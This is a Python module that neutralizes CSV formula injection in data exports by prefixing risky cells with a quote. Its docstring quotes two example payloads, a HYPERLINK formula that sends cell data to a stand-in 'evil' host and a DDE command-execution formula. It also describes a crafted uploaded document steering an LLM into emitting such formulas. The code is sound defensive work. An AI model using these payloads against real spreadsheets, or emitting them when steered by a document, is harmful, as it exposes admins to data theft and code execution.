"""CSV formula-injection (CSV/DDE injection) neutralization for exports.

Spreadsheet apps (Excel, LibreOffice, Google Sheets) interpret a cell whose
text begins with ``= + - @`` — or a leading tab/carriage-return followed by one
of those — as a formula. Exported data in this app includes attacker-influenced
values: actor emails, uploaded file/document names, and especially
LLM-extracted field values derived from uploaded document content. Without
neutralization, a crafted document could make the LLM emit e.g.
``=HYPERLINK("http://evil/?"&A1)`` or ``=cmd|'/c calc'!A1`` that executes when an
admin opens the exported CSV.

Neutralize by prefixing risky cells with a single quote, which spreadsheet apps
treat as "force text". Applied to every string cell we write to a CSV.
"""

from __future__ import annotations

from collections.abc import Iterable

_FORMULA_PREFIXES = ("=", "+", "-", "@")
# Leading tab (\t) and carriage return (\r) can also trigger formula parsing.
_RISKY_LEADING_WHITESPACE = ("\t", "\r")


def sanitize_csv_cell(value: object) -> object:
    """Return ``value`` made safe for a spreadsheet cell.

    Non-strings are returned unchanged (numbers/None can't carry a formula).
    Strings that begin with a formula trigger (optionally after leading tab/CR)
    are prefixed with a single quote to force text interpretation.
    """
    if not isinstance(value, str) or not value:
        return value
    first = value[0]
    if first in _FORMULA_PREFIXES or first in _RISKY_LEADING_WHITESPACE:
        return "'" + value
    return value


def safe_csv_row(values: Iterable[object]) -> list:
    """Map :func:`sanitize_csv_cell` over an iterable of cell values."""
    return [sanitize_csv_cell(v) for v in values]


class SafeCsvWriter:
    """Thin wrapper over a ``csv.writer`` that sanitizes every cell on write.

    Wrap the writer once (``writer = SafeCsvWriter(csv.writer(buf))``) so all
    ``writerow``/``writerows`` calls are neutralized without touching each call
    site.
    """

    def __init__(self, writer) -> None:
        self._writer = writer

    def writerow(self, row) -> None:
        self._writer.writerow(safe_csv_row(row))

    def writerows(self, rows) -> None:
        for row in rows:
            self.writerow(row)


class SafeDictCsvWriter:
    """Wrapper over ``csv.DictWriter`` that sanitizes header + row values.

    Row values (the main injection vector — LLM-extracted content, file names)
    are neutralized while keys are kept intact so they still map to fieldnames.
    ``writeheader`` writes sanitized header cells directly via the underlying
    csv.writer so a crafted schema field name can't smuggle a formula either.
    """

    def __init__(self, writer) -> None:
        self._writer = writer

    def writeheader(self) -> None:
        self._writer.writer.writerow(safe_csv_row(self._writer.fieldnames))

    def writerow(self, row) -> None:
        self._writer.writerow({k: sanitize_csv_cell(v) for k, v in row.items()})

    def writerows(self, rows) -> None:
        for row in rows:
            self.writerow(row)
